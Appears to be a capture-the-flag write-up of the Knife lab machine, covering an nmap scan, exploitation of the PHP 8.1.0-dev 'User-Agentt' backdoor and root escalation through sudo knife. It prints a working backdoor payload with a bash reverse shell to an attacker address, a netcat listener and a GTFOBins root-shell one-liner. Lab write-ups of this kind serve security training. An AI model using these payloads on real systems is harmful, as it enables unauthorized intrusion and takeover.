
- I am given an IP address
- First, I start with a `nmap` scan to see what ports are open
```shell
nmap -sC -sV 10.10.10.242
```
![[Pasted image 20250827115255.png]]
- I have a port `22` open for `ssh` and the port `80` open for a HTTP web application

- Now I go to the web application and I am prompted with some text
![[Pasted image 20250827115451.png]]
- The thing is that I cannot interact with the web app in any way

- I try fuzzing => no result 
- I look for something in the HTML code of the page => no result

- When looking on my burp session for something unusual I spotted that exactly thing that could help me
- That thing was the header `X-Powered-By: PHP/8.1.0-dev`
![[Pasted image 20250827120033.png]]

- Searching for an exploit I found one in `Exploit-DB` https://www.exploit-db.com/exploits/49933, which leads to Remote Code Execution with the `User-Agentt` header
- An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed
- If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the `User-Agentt` header

- The exploit is good but when trying to escalate for root privileges it has some problems and because of that we will exploit the application manually

- To exploit the application manually we will use `burp suite` to send a request in which we will introduce the `User-Agentt: zerodiumsystem("<command>");` header

- First we send a basic request to the `Repeater` in `burp` 
- Then we introduce the header `User-Agentt: zerodiumsystem("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.8/4444 0>&1'");`
![[Pasted image 20250827120938.png]]

- Before we send the request we open a listener with `nc -lvnp 4444` to get the reverse shell
- The request is successful and we get a shell as the user `james` and we can get the user flag from the `user.txt` file
![[Pasted image 20250827121201.png]]

## Root Flag

- Before we start the privilege escalation process we upgrade our shell to a fully functional bash shell using the following code
```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

- Now that we have a proper shell I use the `sudo -l` command to see if there any commands I can execute with higher privileges
![[Pasted image 20250827121540.png]]
- I found the command `/usr/bin/knife` which can be executed as the `root` user

- Searching the internet for some information about this script I found important information in the [gtfobins-knife](https://gtfobins.github.io/gtfobins/knife/) page
- I found that the tool can run `ruby` code and also a one-line script to get a bash terminal
- The script to get the bash terminal + the `sudo` command will allow me to to get a shell as the `root` user 

- So I type in my current session the following script:
```
sudo knife exec -E 'exec "/bin/sh"'
```
- It was a success and I got a shell as the root user and now I can get the system flag from the `/root/root.txt` file
![[Pasted image 20250827122050.png]]

